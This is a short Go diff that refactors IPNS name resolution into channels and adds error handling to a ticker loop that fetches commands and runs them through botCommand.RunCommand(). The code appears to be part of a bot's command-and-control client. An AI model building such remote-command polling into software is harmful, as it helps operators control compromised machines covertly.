@@ -7,11 +7,21 @@ import (
 	"Constants"
 )
 
-func resolveIpns(shell *sh.Shell) string {
-	ipfsAddress, err := shell.Resolve(Constants.IPNS_NAME)
-	check(err)
+func resolveIpns(shell *sh.Shell) (chan string, chan error) {
+	ipfsAddressCh := make(chan string)
+	errCh := make(chan error)
 
-	return ipfsAddress
+	go func() {
+		ipfsAddress, err := shell.Resolve(Constants.IPNS_NAME)
+
+		if err != nil {
+			errCh <- err
+		} else {
+			ipfsAddressCh <- ipfsAddress
+		}
+	}()
+
+	return ipfsAddressCh, errCh
 }
 
 func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
@@ -21,11 +31,10 @@ func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
 		fmt.Println("[fetch command] starting new ticker")
 
 		fmt.Println("[fetch command] resolving ipfs name")
-		c1 := make(chan string, 1)
-		c1 <- resolveIpns(shell)
+		ipfsAddressCh, errCh := resolveIpns(shell)
 
 		select {
-		case ipfsAddress := <-c1:
+		case ipfsAddress := <-ipfsAddressCh:
 			fmt.Println("[fetch command] name resolved")
 
 			if lastAddress == ipfsAddress {
@@ -46,6 +55,9 @@ func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
 
 				botCommand.RunCommand()
 			}
+
+		case err := <-errCh:
+			fmt.Println("[fetch command] error: ", err)
 
 		case <-time.After(time.Second * 30):
 			fmt.Println("[fetch command] timeout")
